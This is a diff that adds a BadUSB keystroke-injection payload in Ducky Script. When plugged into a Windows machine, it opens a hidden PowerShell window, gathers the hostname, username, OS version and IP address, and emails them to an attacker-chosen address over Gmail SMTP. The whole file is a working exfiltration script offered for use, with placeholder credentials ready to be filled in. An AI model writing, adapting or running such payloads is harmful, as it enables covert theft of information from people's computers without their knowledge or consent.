@@ -1,0 +1,39 @@
+REM Author: UNC0V3R3D
+REM Description: Collects system info and sends it via SMTP email using PowerShell.
+REM Version: 1.0
+REM Category: Exfiltration
+REM Target: Windows 10/11
+REM Requirements: Internet connection, SMTP credentials
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING $info = "Hostname: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: " + (Get-WmiObject Win32_OperatingSystem).Caption + "`nIP: " + ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'} | Select-Object -First 1).IPAddress)
+ENTER
+DELAY 400
+STRING $smtp = 'smtp.gmail.com'
+ENTER
+STRING $port = 587
+ENTER
+STRING $from = 'SENDER_EMAIL'
+ENTER
+STRING $to = 'RECEIVER_EMAIL'
+ENTER
+STRING $pass = 'SMTP_PASSWORD'
+ENTER
+STRING $cred = New-Object System.Net.NetworkCredential($from,$pass)
+ENTER
+STRING $client = New-Object System.Net.Mail.SmtpClient($smtp,$port)
+ENTER
+STRING $client.EnableSsl = $true; $client.Credentials = $cred
+ENTER
+STRING $msg = New-Object System.Net.Mail.MailMessage($from,$to,'BadUSB Report',$info)
+ENTER
+STRING $client.Send($msg)
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+REM End of payload
